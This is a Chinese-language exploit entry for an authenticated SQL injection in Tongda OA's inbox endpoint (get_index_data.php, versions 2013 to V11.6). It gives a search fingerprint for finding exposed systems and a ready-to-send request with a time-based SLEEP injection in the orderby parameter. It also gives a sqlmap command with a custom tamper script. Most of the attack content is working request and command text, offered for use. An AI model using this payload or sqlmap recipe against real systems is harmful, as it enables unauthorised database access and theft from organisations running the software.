# 通达OAinbox存在后台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`GET /general/email/inbox/get_index_data.php?asc=0&boxid=&boxname=inbox&curnum=0&emailtype=ALLMAIL&keyword=&orderby=-@%60%27%60%20%20AND%20%28SELECT%205386%20FROM%20%28SELECT%28SLEEP%285%29%29%29rmup%29--%20%27%20&pagelimit=10&tag=&timestamp=1598069103&total= HTTP/1.1`

**请求体 / payload**
```
利用条件：可登录系统的账户，普通权限即可\

登陆后台使用获取到的cookie进行测试
X-Requested-With: XMLHttpRequest
Cookie: {cookie}
Host: {hostname}

sqlmap\
\[TD.py]\(公众号：渗透安全HackTwo
GET /general/email/inbox/get_index_data.php?asc=0&boxid=&boxname=inbox&curnum=0&emailtype=ALLMAIL&keyword=&orderby=-@%60%27%60%20&pagelimit=10&tag=&timestamp=1598069103&total= HTTP/1.1
X-Requested-With: XMLHttpRequest
Cookie: {cookie}
Host: {hostname}
sqlmap -r 1.txt --batch -p orderby --tamper=TD
```

**其他**
- 通达OA inbox存在后台SQL注入漏洞: * 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。通达OA inbox存在后台SQL注入漏洞,攻击者通过漏洞可以获取数据库信息。
- 版本: * 通达OA2013-通达OAV11.6